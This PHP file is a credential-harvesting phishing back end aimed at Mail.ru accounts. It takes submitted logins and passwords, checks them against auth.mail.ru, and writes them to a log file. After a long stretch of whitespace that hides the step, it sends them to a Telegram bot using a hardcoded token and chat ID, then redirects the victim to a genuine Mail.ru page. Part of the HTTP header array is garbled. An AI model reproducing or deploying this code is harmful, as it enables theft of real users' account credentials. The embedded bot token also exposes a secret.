<?PHP 
$log = $_POST['login'];
$Pass = $_POST['password'];
$time = date("H:i | d.m.Y");
$email = fopen("youBasa.php","at"); //путь до базы,файл в котором лежат логи

 if( !@valid($log, $Pass) )
	{
		$auth = false;
	    $valid = Invalid;
	}else{
        $logged = 1;		
		$valid = 'Valid';

	}
		

function valid($log, $Pass)
{
	$pieces = explode("@", $log);
	$domain = $pieces[1];
	$auth = array
	( 
		'Host: auth.mail.ru',
		'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alive',
		'Content-Type: applU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alication/x-www-form-urlencoded',
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://auth.mail.ru/cgi-bin/auth?Domain='.$domain.'&Login='.$log.'&Password='.$Pass);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $auth);
	curl_setopt($ch, CURLOPT_NOBODY, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_NOPROGRESS, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$info = curl_exec($ch);
	curl_close($ch);
	if(preg_match("/Set-Cookie/", $info))
		return true;
	else return false;
}
fwrite($email," <div style=\"color:#000000;\"> <center>  Mail: $log | Password: $Pass | Time:  $time |  $valid ; <center></div>\n");
fclose($email);  


																																																																																																	$token = "604917079:AAHUwkkYGvnV9V_CG3-TZcG8MbG2FWXeyq0" ;
																																																																																																	$chat_id = "-240405268";
																																																																																														$txt =" Логин  $log   Пароль  $Pass ";
																																																															$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/'></head></html>";